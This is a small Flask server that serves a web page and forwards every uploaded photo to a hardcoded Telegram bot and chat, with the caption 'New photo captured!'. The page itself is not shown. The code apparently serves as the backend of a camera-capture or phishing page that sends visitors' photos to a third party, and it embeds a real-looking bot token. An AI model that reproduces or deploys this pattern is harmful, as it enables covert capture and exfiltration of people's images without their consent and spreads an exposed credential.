from flask import Flask, render_template, request
import requests
import os

app = Flask(__name__)

# 🔹 Replace with your bot token & chat ID
BOT_TOKEN = "7534242125:AAH4fvlkOmWmCyd9_XSFi7Nq3rPM8JIEc9s"
CHAT_ID = "7252430326"

@app.route("/")
def home():
    return render_template("index.html")  # Serves the HTML page

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["photo"]
    
    # 🔹 Send to Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {"photo": file}
    data = {"chat_id": CHAT_ID, "caption": "📸 New photo captured!"}
    requests.post(url, files=files, data=data)
    
    return "Photo sent successfully!"

# Run server on Render's port
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
